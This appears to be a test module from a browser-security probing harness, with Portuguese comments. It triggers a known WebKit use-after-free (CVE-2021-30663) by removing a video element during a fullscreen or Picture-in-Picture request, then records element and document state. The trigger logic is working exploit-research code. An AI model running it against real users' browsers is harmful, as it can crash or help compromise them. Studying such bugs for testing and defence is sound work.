/**
 * SC_VIDEO_FULLSCREEN_REMOVE.JS
 * Categoria : MEDIA/DOM — Use-After-Free
 * Alvo      : WebCore::HTMLVideoElement / FullscreenManager C++
 * Técnica   : Solicita fullscreen ou Picture-in-Picture num elemento
 *             <video>, remove o elemento do DOM durante a transição, e
 *             observa o estado do FullscreenManager C++ que pode manter
 *             ponteiro para o elemento liberado.
 * Referência: CVE-2021-30663 / WebKit fullscreen lifecycle UAF
 */

export default {
    id:          'VIDEO_FULLSCREEN_REMOVE',
    category:    'MEDIA/DOM',
    risk:        'HIGH',
    description: 'HTMLVideoElement removido durante pedido de fullscreen/PiP. '
                + 'Testa ponteiro stale no FullscreenManager C++ do WebCore.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _video:       null,
    _container:   null,
    _pipWindow:   null,
    _errType:     null,
    _readyState0: -1,

    supported: function() {
        return typeof HTMLVideoElement !== 'undefined';
    },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._errType  = null;
        this._pipWindow = null;

        this._container = document.createElement('div');
        document.body.appendChild(this._container);

        this._video = document.createElement('video');
        this._video.style.cssText = 'width:160px;height:90px;position:absolute;left:-9999px';
        this._video.muted    = true;
        this._video.autoplay = false;
        this._video.loop     = false;

        // Usa um blob de vídeo mínimo válido (não carrega de rede)
        const blob = new Blob([''], { type: 'video/mp4' });
        this._video.src = URL.createObjectURL(blob);

        this._container.appendChild(this._video);

        await new Promise(r => {
            this._video.addEventListener('loadedmetadata', r, { once: true });
            this._video.addEventListener('error', r, { once: true });
            setTimeout(r, 500);
        });

        this._readyState0 = this._video.readyState;
        await new Promise(r => setTimeout(r, 10));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        // Solicita fullscreen — inicia a transição C++
        const fsPromise = this._video.requestFullscreen?.()?.catch(e => {
            this._errType = e.constructor.name;
        });

        // Remove IMEDIATAMENTE, antes que a transição termine
        this._video.remove();
        void document.body.offsetWidth;

        // Aguarda o resultado da Promise de fullscreen
        await fsPromise?.catch(() => {});

        // Tenta Picture-in-Picture também
        if (typeof this._video.requestPictureInPicture === 'function') {
            try {
                this._pipWindow = await this._video.requestPictureInPicture();
            } catch(e) {
                this._errType = (this._errType ?? '') + '|PiP:' + e.constructor.name;
            }
        }

        // Força exit de estados de apresentação
        try { await document.exitFullscreen?.(); } catch(_) {}
        try { await document.exitPictureInPicture?.(); } catch(_) {}

        await new Promise(r => setTimeout(r, 30));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-5] estado do video após remoção
        s => s._video.isConnected,
        s => s._video.readyState,
        s => s._video.paused,
        s => s._video.ended,
        s => s._video.error?.code ?? 'null',
        s => s._video.networkState,

        // [6-9] estado fullscreen do documento
        s => document.fullscreenElement === s._video,
        s => document.fullscreenElement?.nodeName ?? 'null',
        s => document.pictureInPictureElement === s._video,
        s => typeof document.fullscreenElement,

        // [10-12] PiP window
        s => s._pipWindow?.width  ?? 'null',
        s => s._pipWindow?.height ?? 'null',
        s => s._errType ?? 'null',

        // [13-14] readyState não deve ter mudado após remoção
        s => s._readyState0,
        s => s._container.isConnected,
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        try { await document.exitFullscreen?.();        } catch(_) {}
        try { await document.exitPictureInPicture?.();  } catch(_) {}
        try { this._pipWindow?.close?.();               } catch(_) {}
        this._container?.remove();
        this._container = null;
        this._video     = null;
        this._pipWindow = null;
        this._errType   = null;
        this._readyState0 = -1;
    }
};
